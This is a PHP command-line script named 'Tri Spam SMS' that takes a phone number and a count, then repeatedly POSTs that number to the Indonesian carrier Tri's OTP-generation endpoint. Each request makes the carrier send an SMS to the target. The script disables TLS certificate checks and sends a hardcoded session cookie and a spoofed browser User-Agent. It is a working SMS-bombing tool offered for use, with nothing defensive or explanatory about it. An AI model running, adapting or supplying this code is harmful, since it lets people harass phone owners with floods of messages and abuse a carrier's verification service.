<?php
/*
C0ded by SugiCode <3
*/
function banner(){
    system('clear');
    echo "
 ____                          ____
 \ \ \                        / / /
  \ \ \                      / / / 
   > > >  [ Tri Spam SMS ]  < < <  
  / / /                      \ \ \ 
 /_/_/                        \_\_\
+-----------[ Su91C0d3X ]--------------+\n";
}
if (empty($argv[1]) or empty($argv[2])) {
    banner();
    echo "Usage : php ".$argv[0]." phone-number request\n";
    echo "Example : \n";
    echo "php ".$argv[0]." 0869696969 100\n";
}
else {
    banner();
$request = $argv[2];
for ($x=1; $x<=$request; $x++) {
sleep(2);
$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://regis	trasi.tri.co.id/daftar/generateOTP");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=".$argv[1]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: PHPSESSID=5noisam2cugiq25l6374u79975',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36',
            'Accept: application/json, text/javascript, */*; q=0.01'
  ));
        $server_output = curl_exec ($ch);
        curl_close ($ch);
        $server_output = json_decode($server_output, TRUE);
        if ($server_output['status'] == "success") {
            echo "[".$x."/".$request."][".$argv[1]."] Success\n";
        }
        else {
            echo "[".$x."/".$request."][".$argv[1]."] Failed!\n";
        }
       }
}
        ?>
